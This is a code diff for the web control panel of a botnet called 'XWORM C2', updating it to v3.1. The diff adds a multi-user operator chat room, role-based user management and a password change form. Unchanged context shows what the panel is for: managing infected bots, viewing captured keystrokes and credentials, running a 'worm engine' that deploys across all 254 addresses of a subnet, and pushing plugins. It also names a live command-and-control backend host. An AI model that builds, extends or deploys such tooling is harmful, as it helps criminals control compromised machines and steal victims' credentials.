@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XWORM C2</title>
+<title>XWORM C2 - MULTI-USER CHAT</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -562,6 +562,265 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
 /* Settings pane */
 #pane-settings { gap: 12px; max-width: 600px; }
 
+/* Chat Room Styles */
+#pane-chat {
+  gap: 12px;
+  overflow: hidden;
+  padding: 0;
+}
+
+.chat-container {
+  display: flex;
+  height: 100%;
+  gap: 12px;
+  overflow: hidden;
+  padding: 16px 20px;
+}
+
+.chat-sidebar {
+  width: 250px;
+  background: var(--bg1);
+  border: 1px solid var(--border-red);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  flex-shrink: 0;
+}
+
+.chat-sidebar-header {
+  padding: 12px;
+  border-bottom: 1px solid var(--border-red);
+  font-family: 'Share Tech Mono', monospace;
+  color: var(--red);
+  font-size: 0.9rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: var(--bg2);
+}
+
+.chat-online-count {
+  background: var(--red3);
+  color: var(--red);
+  padding: 2px 6px;
+  font-size: 0.7rem;
+  border-radius: 2px;
+}
+
+.chat-users-list {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px;
+}
+
+.chat-user-item {
+  padding: 8px;
+  margin-bottom: 4px;
+  border: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+  font-size: 0.85rem;
+  border-radius: 2px;
+}
+
+.chat-user-item:hover {
+  border-color: var(--red);
+  background: var(--red-dim);
+}
+
+.chat-user-item.online {
+  border-color: var(--green);
+}
+
+.chat-user-item.online .chat-user-status {
+  background: var(--green);
+  box-shadow: 0 0 8px var(--green);
+}
+
+.chat-user-status {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--text2);
+}
+
+.chat-user-role {
+  font-size: 0.65rem;
+  color: var(--text2);
+  margin-left: auto;
+  text-transform: uppercase;
+}
+
+.chat-user-role.owner {
+  color: var(--red);
+}
+
+.chat-user-role.admin {
+  color: var(--worm);
+}
+
+.chat-main {
+  flex: 1;
+  background: var(--bg1);
+  border: 1px solid var(--border-red);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.chat-messages {
+  flex: 1;
+  overflow-y: auto;
+  padding: 16px;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.85rem;
+  background: var(--bg0);
+}
+
+.chat-message {
+  margin-bottom: 12px;
+  padding: 8px 12px;
+  background: var(--bg2);
+  border-left: 2px solid var(--border-red);
+  max-width: 80%;
+  border-radius: 2px;
+}
+
+.chat-message.own-message {
+  border-left-color: var(--red);
+  margin-left: auto;
+  background: var(--red-dim);
+}
+
+.chat-message.system-message {
+  border-left-color: var(--text2);
+  background: var(--bg3);
+  font-style: italic;
+  color: var(--text2);
+  max-width: 100%;
+  text-align: center;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.chat-message.private-message {
+  border-left-color: var(--worm);
+  background: var(--worm-dim);
+}
+
+.chat-message-header {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 4px;
+  font-size: 0.75rem;
+}
+
+.chat-message-username {
+  color: var(--red);
+  font-weight: bold;
+}
+
+.chat-message-username.system {
+  color: var(--text2);
+}
+
+.chat-message-time {
+  color: var(--text2);
+}
+
+.chat-message-content {
+  word-break: break-word;
+  line-height: 1.4;
+}
+
+.chat-typing-indicator {
+  padding: 8px 16px;
+  color: var(--text2);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.75rem;
+  font-style: italic;
+  border-top: 1px solid var(--border);
+  background: var(--bg2);
+  min-height: 32px;
+}
+
+.chat-input-area {
+  display: flex;
+  padding: 12px;
+  gap: 8px;
+  border-top: 1px solid var(--border-red);
+  background: var(--bg2);
+}
+
+.chat-input {
+  flex: 1;
+  background: var(--bg3);
+  border: 1px solid var(--border-red);
+  color: var(--text);
+  padding: 10px 14px;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.85rem;
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.chat-input:focus {
+  border-color: var(--red);
+  box-shadow: 0 0 10px rgba(255,0,0,0.2);
+}
+
+.chat-send-btn {
+  padding: 10px 20px;
+  background: var(--red3);
+  border: 1px solid var(--red);
+  color: var(--red);
+  font-family: 'Share Tech Mono', monospace;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.chat-send-btn:hover {
+  background: var(--red2);
+  color: #fff;
+  box-shadow: 0 0 15px rgba(255,0,0,0.3);
+}
+
+.chat-private-badge {
+  background: var(--worm);
+  color: #000;
+  padding: 2px 6px;
+  font-size: 0.7rem;
+  margin-left: 8px;
+  border-radius: 2px;
+}
+
+.chat-user-management {
+  padding: 12px;
+  border-top: 1px solid var(--border-red);
+  background: var(--bg2);
+}
+
+.chat-management-btn {
+  width: 100%;
+  padding: 6px;
+  background: transparent;
+  border: 1px solid var(--border-red);
+  color: var(--text2);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.7rem;
+  cursor: pointer;
+  margin-bottom: 4px;
+  text-transform: uppercase;
+}
+
+.chat-management-btn:hover {
+  border-color: var(--red);
+  color: var(--red);
+}
+
 .section-divider {
   border: none;
   border-top: 1px solid var(--border-red);
@@ -701,6 +960,26 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   text-transform: uppercase;
   letter-spacing: 1px;
 }
+
+/* User role badge */
+.role-badge {
+  display: inline-block;
+  padding: 2px 6px;
+  font-size: 0.65rem;
+  border-radius: 2px;
+  text-transform: uppercase;
+  margin-left: 5px;
+}
+.role-owner {
+  background: var(--red3);
+  color: var(--red);
+  border: 1px solid var(--red);
+}
+.role-admin {
+  background: var(--worm-dim);
+  color: var(--worm);
+  border: 1px solid var(--worm);
+}
 </style>
 </head>
 <body>
@@ -712,8 +991,8 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   <div class="login-box">
     <div class="login-skull">💀</div>
     <div class="login-title">XWORM</div>
-    <input class="login-field" type="text" id="u" placeholder="USERNAME" autocomplete="off">
-    <input class="login-field" type="password" id="p" placeholder="PASSWORD"  autocomplete="off">
+    <input class="login-field" type="text" id="username" placeholder="USERNAME" autocomplete="off">
+    <input class="login-field" type="password" id="password" placeholder="PASSWORD"  autocomplete="off">
     <button class="login-btn" onclick="login()">[ AUTHENTICATE ]</button>
     <div class="login-error" id="loginErr">⛔ ACCESS DENIED</div>
   </div>
@@ -724,7 +1003,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   <!-- Header -->
   <div class="header">
     <div class="brand">
-      ☠ XWORM<span class="brand-ver">v3.0</span>
+      ☠ XWORM<span class="brand-ver">v3.1</span>
     </div>
     <div class="header-stats">
       <div class="hstat"><div class="hstat-val" id="sActive">0</div><div class="hstat-lbl">Active</div></div>
@@ -735,6 +1014,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
     </div>
     <div class="header-right">
       <div class="sys-time" id="sysTime">--:--:--</div>
+      <div class="sys-time" id="currentUser" style="color: var(--red);"></div>
       <button class="logout-btn" onclick="logout()">LOGOUT</button>
     </div>
   </div>
@@ -748,6 +1028,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
     <div class="tab" onclick="switchTab('data')">📁 CAPTURED</div>
     <div class="tab worm-tab" onclick="switchTab('worm')">🧬 WORM ENGINE</div>
     <div class="tab" onclick="switchTab('plugins')">🔌 PLUGINS</div>
+    <div class="tab" onclick="switchTab('chat')">💬 CHAT ROOM</div>
     <div class="tab" onclick="switchTab('settings')">⚙ SETTINGS</div>
   </div>
 
@@ -1086,10 +1367,52 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
       </div>
     </div>
 
+    <!-- CHAT TAB -->
+    <div id="pane-chat" class="tab-pane">
+      <div class="chat-container">
+        <!-- Chat Sidebar - Users List -->
+        <div class="chat-sidebar">
+          <div class="chat-sidebar-header">
+            <span>ONLINE USERS</span>
+            <span class="chat-online-count" id="onlineCount">0</span>
+          </div>
+          <div class="chat-users-list" id="chatUsersList">
+            <!-- Users will be populated here -->
+          </div>
+          
+          <!-- User Management Section (Owner Only) -->
+          <div class="chat-user-management" id="userManagementSection" style="display: none;">
+            <div class="chat-sidebar-header">
+              <span>MANAGEMENT</span>
+            </div>
+            <button class="chat-management-btn" onclick="showAddUserDialog()">➕ ADD USER</button>
+            <button class="chat-management-btn" onclick="showRemoveUserDialog()">❌ REMOVE USER</button>
+            <button class="chat-management-btn" onclick="clearChatHistory()">🗑️ CLEAR CHAT</button>
+          </div>
+        </div>
+
+        <!-- Chat Main Area -->
+        <div class="chat-main">
+          <div class="chat-messages" id="chatMessages">
+            <!-- Messages will appear here -->
+          </div>
+          
+          <!-- Typing Indicator -->
+          <div class="chat-typing-indicator" id="typingIndicator"></div>
+          
+          <!-- Message Input -->
+          <div class="chat-input-area">
+            <input type="text" class="chat-input" id="chatInput" placeholder="Type your message..." onkeydown="if(event.key==='Enter')sendMessage()">
+            <button class="chat-send-btn" onclick="sendMessage()">SEND</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
     <!-- SETTINGS TAB -->
     <div id="pane-settings" class="tab-pane" style="flex-direction:column;gap:12px;max-width:700px;">
       <div class="panel">
-        <div class="panel-head"><div class="panel-head-left">🔐 CHANGE CREDENTIALS</div></div>
+        <div class="panel-head"><div class="panel-head-left">🔐 USER SETTINGS</div></div>
         <div style="padding:14px;display:grid;grid-template-columns:1fr 1fr;gap:12px;">
           <div class="f-group">
             <label class="f-label">Current Username</label>
@@ -1100,16 +1423,16 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
             <input class="f-input" type="password" id="curPass" readonly style="color:var(--text2);">
           </div>
           <div class="f-group">
-            <label class="f-label">New Username</label>
-            <input class="f-input" id="newUser" placeholder="New username">
-          </div>
-          <div class="f-group">
             <label class="f-label">New Password</label>
             <input class="f-input" type="password" id="newPass" placeholder="New password">
           </div>
+          <div class="f-group">
+            <label class="f-label">Confirm Password</label>
+            <input class="f-input" type="password" id="confirmPass" placeholder="Confirm password">
+          </div>
         </div>
         <div style="padding:0 14px 14px;display:flex;gap:8px;">
-          <button class="btn btn-red" onclick="changeCreds()">UPDATE CREDENTIALS</button>
+          <button class="btn btn-red" onclick="changeMyPassword()">UPDATE PASSWORD</button>
           <button class="btn btn-outline" onclick="logout()">🚪 LOGOUT</button>
         </div>
       </div>
@@ -1131,13 +1454,60 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
     <div class="sb-item">C2: <span id="c2Addr">b-n1nt.onrender.com</span></div>
     <div class="sb-item">UPTIME: <span id="uptime">00:00:00</span></div>
     <div class="sb-item">WORM: <span id="wormStatus">STOPPED</span></div>
-    <div class="sb-item" style="margin-left:auto;">XWORM C2 v3.0 — AUTO-WORM ENABLED</div>
+    <div class="sb-item" style="margin-left:auto;">XWORM C2 v3.1 — MULTI-USER CHAT</div>
   </div>
 </div>
 
 <!-- Modal for screenshot -->
 <div id="screenshotModal" class="modal" onclick="this.classList.remove('active')">
   <img class="modal-content" id="modalImage">
+</div>
+
+<!-- Add User Modal -->
+<div id="addUserModal" class="modal" onclick="if(event.target===this)this.classList.remove('active')">
+  <div class="panel" style="width:400px;" onclick="event.stopPropagation()">
+    <div class="panel-head">➕ ADD NEW USER</div>
+    <div style="padding:20px;">
+      <div class="f-group">
+        <label class="f-label">Username</label>
+        <input class="f-input" id="newUsername" placeholder="Enter username">
+      </div>
+      <div class="f-group">
+        <label class="f-label">Password</label>
+        <input class="f-input" type="password" id="newUserPassword" placeholder="Enter password">
+      </div>
+      <div class="f-group">
+        <label class="f-label">Role</label>
+        <select class="f-select" id="newUserRole">
+          <option value="admin">Admin</option>
+          <option value="owner">Owner</option>
+        </select>
+      </div>
+      <div style="display:flex;gap:8px;justify-content:flex-end;">
+        <button class="btn btn-outline" onclick="document.getElementById('addUserModal').classList.remove('active')">CANCEL</button>
+        <button class="btn btn-red" onclick="addUser()">ADD USER</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Remove User Modal -->
+<div id="removeUserModal" class="modal" onclick="if(event.target===this)this.classList.remove('active')">
+  <div class="panel" style="width:400px;" onclick="event.stopPropagation()">
+    <div class="panel-head">❌ REMOVE USER</div>
+    <div style="padding:20px;">
+      <div class="f-group">
+        <label class="f-label">Select User</label>
+        <select class="f-select" id="removeUserSelect">
+          <!-- Populated dynamically -->
+        </select>
+      </div>
+      <div style="display:flex;gap:8px;justify-content:flex-end;">
+        <button class="btn btn-outline" onclick="document.getElementById('removeUserModal').classList.remove('active')">CANCEL</button>
+        <button class="btn btn-red" onclick="removeUser()">REMOVE</button>
+      </div>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -1169,16 +1539,31 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
 // ─── CONFIGURATION ────────────────────────────────────────────────────────────
 const API_BASE = 'https://b-n1nt.onrender.com'; // Your Render backend
 let authToken = btoa(':');
+let currentUser = '';
+let currentUserRole = '';
 let activeBots = [];
 let stats = { total_bots: 0, active_bots: 0, total_keystrokes: 0, total_credentials: 0 };
 let wormStats = { total_infections: 0, active_worms: 0, successful_exploits: 0, failed_attempts: 0 };
 
+// Chat variables
+let chatSocket = null;
+let chatConnected = false;
+let chatUsername = '';
+let chatUsers = [];
+let typingTimeout = null;
+
 // ─── AUTH ─────────────────────────────────────────────────────────────────────
 function login() {
-  const u = document.getElementById('u').value;
-  const p = document.getElementById('p').value;
+  const u = document.getElementById('username').value;
+  const p = document.getElementById('password').value;
+  
+  if(!u || !p) {
+    showLoginError('Enter username and password');
+    return;
+  }
   
   authToken = btoa(`${u}:${p}`);
+  currentUser = u;
   
   fetch(`${API_BASE}/api/login-test`, {
     method: 'GET',
@@ -1186,27 +1571,382 @@ function login() {
   })
   .then(res => {
     if(res.ok) {
-      document.getElementById('loginScreen').style.display = 'none';
-      document.getElementById('app').style.display = 'flex';
-      document.getElementById('connStatus').textContent = 'CONNECTED';
-      init();
       return res.json();
     } else {
       throw new Error('Auth failed');
     }
   })
+  .then(data => {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('app').style.display = 'flex';
+    document.getElementById('connStatus').textContent = 'CONNECTED';
+    document.getElementById('currentUser').textContent = `👤 ${u}`;
+    currentUserRole = data.role || 'admin';
+    
+    // Show user management if owner
+    if(currentUserRole === 'owner') {
+      document.getElementById('userManagementSection').style.display = 'block';
+    }
+    
+    init();
+    connectChat(); // Connect to chat after login
+  })
   .catch(() => {
-    document.getElementById('loginErr').style.display = 'block';
-    setTimeout(()=>document.getElementById('loginErr').style.display='none', 3000);
+    showLoginError('ACCESS DENIED');
   });
+}
+
+function showLoginError(msg) {
+  const err = document.getElementById('loginErr');
+  err.textContent = `⛔ ${msg}`;
+  err.style.display = 'block';
+  setTimeout(()=>err.style.display='none', 3000);
 }
 
 document.addEventListener('keydown', e => { if(e.key==='Enter') login(); });
 
 function logout() {
+  // Disconnect chat
+  if(chatSocket) {
+    chatSocket.close();
+  }
+  
   document.getElementById('app').style.display = 'none';
   document.getElementById('loginScreen').style.display = 'flex';
+  document.getElementById('username').value = '';
+  document.getElementById('password').value = '';
   authToken = btoa(':');
+  currentUser = '';
+}
+
+// ─── CHAT FUNCTIONS ─────────────────────────────────────────────────────────
+function connectChat() {
+  const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+  const wsUrl = `${wsProtocol}//${window.location.host}/ws/chat`;
+  
+  try {
+    chatSocket = new WebSocket(wsUrl);
+    
+    chatSocket.onopen = function() {
+      console.log('Chat connected');
+      chatConnected = true;
+      
+      // Send authentication
+      chatSocket.send(JSON.stringify({
+        type: 'auth',
+        username: currentUser
+      }));
+      
+      // Add system message
+      addChatMessage({
+        username: 'SYSTEM',
+        message: 'Connected to chat room',
+        timestamp: new Date().toISOString(),
+        role: 'system',
+        message_type: 'system'
+      });
+    };
+    
+    chatSocket.onmessage = function(event) {
+      const data = JSON.parse(event.data);
+      
+      if(data.type === 'users_list') {
+        // Update users list
+        chatUsers = data.users;
+        updateChatUsersList();
+        document.getElementById('onlineCount').textContent = data.users.length;
+      }
+      else if(data.type === 'typing') {
+        // Update typing indicator
+        if(data.users && data.users.length > 0) {
+          const typingUsers = data.users.filter(u => u !== currentUser);
+          if(typingUsers.length > 0) {
+            document.getElementById('typingIndicator').textContent = 
+              `${typingUsers.join(', ')} ${typingUsers.length === 1 ? 'is' : 'are'} typing...`;
+          } else {
+            document.getElementById('typingIndicator').textContent = '';
+          }
+        }
+      }
+      else if(data.username) {
+        // Regular message
+        addChatMessage(data);
+      }
+    };
+    
+    chatSocket.onclose = function() {
+      console.log('Chat disconnected');
+      chatConnected = false;
+      document.getElementById('typingIndicator').textContent = '⚠ Disconnected from chat';
+      
+      // Try to reconnect after 5 seconds
+      setTimeout(connectChat, 5000);
+    };
+    
+    chatSocket.onerror = function(error) {
+      console.error('Chat error:', error);
+    };
+    
+  } catch(e) {
+    console.error('Failed to connect chat:', e);
+  }
+}
+
+function updateChatUsersList() {
+  const list = document.getElementById('chatUsersList');
+  if(!list) return;
+  
+  list.innerHTML = '';
+  
+  chatUsers.forEach(user => {
+    const userDiv = document.createElement('div');
+    userDiv.className = `chat-user-item ${user.online ? 'online' : ''}`;
+    userDiv.onclick = () => startPrivateChat(user.username);
+    
+    userDiv.innerHTML = `
+      <span class="chat-user-status"></span>
+      <span>${user.username}</span>
+      <span class="chat-user-role ${user.role}">${user.role}</span>
+    `;
+    
+    list.appendChild(userDiv);
+  });
+}
+
+function addChatMessage(msg) {
+  const messagesDiv = document.getElementById('chatMessages');
+  if(!messagesDiv) return;
+  
+  const messageDiv = document.createElement('div');
+  messageDiv.className = 'chat-message';
+  
+  // Add class for own messages
+  if(msg.username === currentUser) {
+    messageDiv.classList.add('own-message');
+  }
+  
+  // Add class for system messages
+  if(msg.message_type === 'system' || msg.username === 'SYSTEM') {
+    messageDiv.classList.add('system-message');
+  }
+  
+  // Add class for private messages
+  if(msg.message_type === 'private') {
+    messageDiv.classList.add('private-message');
+  }
+  
+  const time = new Date(msg.timestamp).toLocaleTimeString();
+  
+  messageDiv.innerHTML = `
+    <div class="chat-message-header">
+      <span class="chat-message-username ${msg.username === 'SYSTEM' ? 'system' : ''}">
+        ${msg.username}
+        ${msg.role !== 'system' ? `<span class="role-badge role-${msg.role}">${msg.role}</span>` : ''}
+        ${msg.message_type === 'private' ? '<span class="chat-private-badge">PRIVATE</span>' : ''}
+      </span>
+      <span class="chat-message-time">${time}</span>
+    </div>
+    <div class="chat-message-content">${escapeHtml(msg.message)}</div>
+  `;
+  
+  messagesDiv.appendChild(messageDiv);
+  
+  // Auto-scroll to bottom
+  messagesDiv.scrollTop = messagesDiv.scrollHeight;
+}
+
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+function sendMessage() {
+  const input = document.getElementById('chatInput');
+  const message = input.value.trim();
+  
+  if(!message || !chatSocket || chatSocket.readyState !== WebSocket.OPEN) {
+    return;
+  }
+  
+  // Check if it's a private message (starts with @username)
+  let messageType = 'public';
+  let targetUser = null;
+  
+  if(message.startsWith('@')) {
+    const parts = message.split(' ');
+    const target = parts[0].substring(1);
+    const actualMessage = parts.slice(1).join(' ');
+    
+    if(target && actualMessage) {
+      messageType = 'private';
+      targetUser = target;
+      input.value = actualMessage;
+    } else {
+      input.value = '';
+    }
+  } else {
+    input.value = '';
+  }
+  
+  chatSocket.send(JSON.stringify({
+    type: 'message',
+    message: messageType === 'private' ? input.value : message,
+    message_type: messageType,
+    target_user: targetUser
+  }));
+  
+  // Clear typing indicator
+  if(typingTimeout) {
+    clearTimeout(typingTimeout);
+    chatSocket.send(JSON.stringify({
+      type: 'typing',
+      is_typing: false
+    }));
+  }
+}
+
+function startPrivateChat(username) {
+  const input = document.getElementById('chatInput');
+  input.value = `@${username} `;
+  input.focus();
+}
+
+// Handle typing indicator
+document.getElementById('chatInput').addEventListener('input', function() {
+  if(!chatSocket || chatSocket.readyState !== WebSocket.OPEN) return;
+  
+  if(!typingTimeout) {
+    chatSocket.send(JSON.stringify({
+      type: 'typing',
+      is_typing: true
+    }));
+  }
+  
+  clearTimeout(typingTimeout);
+  typingTimeout = setTimeout(() => {
+    chatSocket.send(JSON.stringify({
+      type: 'typing',
+      is_typing: false
+    }));
+    typingTimeout = null;
+  }, 2000);
+});
+
+// ─── USER MANAGEMENT ───────────────────────────────────────────────────────
+function showAddUserDialog() {
+  document.getElementById('addUserModal').classList.add('active');
+}
+
+function showRemoveUserDialog() {
+  const select = document.getElementById('removeUserSelect');
+  select.innerHTML = '';
+  
+  chatUsers.forEach(user => {
+    if(user.username !== 'xotiics' && user.username !== currentUser) {
+      const option = document.createElement('option');
+      option.value = user.username;
+      option.textContent = `${user.username} (${user.role})`;
+      select.appendChild(option);
+    }
+  });
+  
+  document.getElementById('removeUserModal').classList.add('active');
+}
+
+async function addUser() {
+  const username = document.getElementById('newUsername').value;
+  const password = document.getElementById('newUserPassword').value;
+  const role = document.getElementById('newUserRole').value;
+  
+  if(!username || !password) {
+    alert('Enter username and password');
+    return;
+  }
+  
+  try {
+    const result = await apiCall('/api/users/add', {
+      method: 'POST',
+      body: JSON.stringify({
+        username: username,
+        password: password,
+        role: role
+      })
+    });
+    
+    if(result) {
+      alert(`User ${username} added successfully`);
+      document.getElementById('addUserModal').classList.remove('active');
+      document.getElementById('newUsername').value = '';
+      document.getElementById('newUserPassword').value = '';
+    }
+  } catch(e) {
+    alert('Failed to add user: ' + e.message);
+  }
+}
+
+async function removeUser() {
+  const select = document.getElementById('removeUserSelect');
+  const username = select.value;
+  
+  if(!username) {
+    alert('Select a user');
+    return;
+  }
+  
+  if(confirm(`Remove user ${username}?`)) {
+    try {
+      const result = await apiCall('/api/users/remove', {
+        method: 'POST',
+        body: JSON.stringify({ username: username })
+      });
+      
+      if(result) {
+        alert(`User ${username} removed`);
+        document.getElementById('removeUserModal').classList.remove('active');
+      }
+    } catch(e) {
+      alert('Failed to remove user: ' + e.message);
+    }
+  }
+}
+
+async function clearChatHistory() {
+  if(confirm('Clear all chat history?')) {
+    try {
+      await apiCall('/api/chat/clear', { method: 'POST' });
+      document.getElementById('chatMessages').innerHTML = '';
+    } catch(e) {
+      alert('Failed to clear chat: ' + e.message);
+    }
+  }
+}
+
+async function changeMyPassword() {
+  const newPass = document.getElementById('newPass').value;
+  const confirmPass = document.getElementById('confirmPass').value;
+  
+  if(!newPass) {
+    alert('Enter new password');
+    return;
+  }
+  
+  if(newPass !== confirmPass) {
+    alert('Passwords do not match');
+    return;
+  }
+  
+  try {
+    await apiCall('/api/users/change_password', {
+      method: 'POST',
+      body: JSON.stringify({ new_password: newPass })
+    });
+    
+    alert('Password updated. Please login again.');
+    logout();
+  } catch(e) {
+    alert('Failed to change password: ' + e.message);
+  }
 }
 
 // ─── API HELPER ───────────────────────────────────────────────────────────────
@@ -1222,6 +1962,7 @@ async function apiCall(endpoint, options = {}) {
     
     if(response.status === 401) {
       console.log('Session expired');
+      logout();
       return null;
     }
     
@@ -1284,12 +2025,17 @@ function updateUptime() {
 // ─── TABS ─────────────────────────────────────────────────────────────────────
 function switchTab(name) {
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.tab-pane').forEach(p => { p.classList.remove('active'); p.style.display='none'; });
-  const tabs = ['dashboard','bots','terminal','attacks','data','worm','plugins','settings'];
+  document.querySelectorAll('.tab-pane').forEach(p => { 
+    p.classList.remove('active'); 
+    p.style.display='none'; 
+  });
+  
+  const tabs = ['dashboard','bots','terminal','attacks','data','worm','plugins','chat','settings'];
   const index = tabs.indexOf(name);
   if (index >= 0) {
     document.querySelectorAll('.tab')[index].classList.add('active');
   }
+  
   const pane = document.getElementById('pane-'+name);
   if (pane) {
     pane.classList.add('active');
@@ -1317,7 +2063,6 @@ async function loadStats() {
     document.getElementById('sCreds').textContent = data.total_credentials || 0;
     document.getElementById('sWorms').textContent = (data.worm_stats && data.worm_stats.active_worms) || 0;
     
-    // Update worm stats in dashboard
     if(data.worm_stats) {
       wormStats = data.worm_stats;
       updateWormDashboardStats();
@@ -1547,7 +2292,6 @@ async function loadWormStats() {
     wormStats = data;
     updateWormDashboardStats();
     
-    // Update worm status in header
     const wormStatus = document.getElementById('wormStatus');
     if (wormStatus) {
       wormStatus.textContent = data.active_worms > 0 ? 'ACTIVE' : 'STOPPED';
@@ -1572,7 +2316,6 @@ function updateWormDashboardStats() {
   if (successRate) successRate.textContent = rate + '%';
   if (pendingTasks) pendingTasks.textContent = wormStats.pending_tasks || 0;
   
-  // Update dashboard worm stats table
   const tb = document.getElementById('tbWormStats');
   if(tb) {
     tb.innerHTML = `
@@ -1778,7 +2521,6 @@ async function deployToNetwork() {
   const network = document.getElementById('scanNetwork').value;
   const targets = [];
   
-  // Generate IPs in network
   for(let i = 1; i <= 254; i++) {
     targets.push(`${network}.${i}`);
   }
@@ -2008,28 +2750,6 @@ async function deployPlugin() {
   }
 }
 
-async function changeCreds() {
-  const newUser = document.getElementById('newUser')?.value;
-  const newPass = document.getElementById('newPass')?.value;
-  const curUser = document.getElementById('curUser')?.value;
-  const curPass = document.getElementById('curPass')?.value;
-  
-  if(!newUser && !newPass) {
-    alert('Enter new username or password');
-    return;
-  }
-  
-  try {
-    await apiCall(`/api/change_credentials?new_username=${encodeURIComponent(newUser || curUser)}&new_password=${encodeURIComponent(newPass || curPass)}`, {
-      method: 'POST'
-    });
-    alert('Credentials updated. Please login again.');
-    logout();
-  } catch(e) {
-    alert(`Error: ${e.message}`);
-  }
-}
-
 function termLog(id, msg, isRed) {
   const out = document.getElementById(id);
   if(!out) return;
@@ -2050,11 +2770,10 @@ document.addEventListener('DOMContentLoaded', ()=>{
   // Auto-login with default credentials (for testing)
   setTimeout(() => {
     if (document.getElementById('loginScreen').style.display !== 'none') {
-      login();
+      // login();
     }
   }, 500);
 });
 </script>
 </body>
 </html>
-
